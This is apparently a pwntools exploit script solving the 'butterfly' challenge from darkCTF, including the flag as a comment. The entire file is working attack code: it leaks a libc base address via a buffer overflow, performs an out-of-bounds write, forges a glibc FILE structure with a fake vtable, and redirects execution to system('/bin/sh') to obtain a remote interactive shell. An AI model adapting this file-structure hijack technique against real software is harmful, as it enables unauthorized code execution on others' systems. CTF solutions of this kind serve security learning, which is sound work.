#exploit for butterfly
#darkCTF{https://www.youtube.com/watch?v=L2C8rVO2lAg}
from pwn import *
import time
elf = ELF("./butterfly")
libc=elf.libc
context.binary=elf
context.arch='amd64'
#target=process([elf.path])
target=remote('butterfly.darkarmy.xyz',32770)
context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

name="A"*0x50
sa("name: ",name)
libc_base=u64(target.recv(0x56)[0x50:0x56].ljust(8,"\x00"))-0x1b39e7
print(hex(libc_base))
libc_malloc_hook=libc_base+libc.symbols["__malloc_hook"]
index=-6
sla("write: ",str(index))
rip = libc_base + libc.symbols['system']
rdi = libc_base + next(libc.search("/bin/sh")) 
assert(rdi%2 == 0)
io_str_overflow_ptr_addr = libc_base + libc.symbols['_IO_file_jumps'] + 0xd8
fake_vtable_addr = io_str_overflow_ptr_addr - 7*8
fileStr=FileStructure(null=libc_malloc_hook)
fileStr._IO_buf_base=0
fileStr._IO_buf_end=(rdi-100)/2
fileStr._IO_write_ptr=(rdi-100)/2
fileStr._IO_write_base=0
fileStr.vtable=fake_vtable_addr
payload=str(fileStr)
payload+=p64(rip)
sa("data: ",payload)
target.interactive()
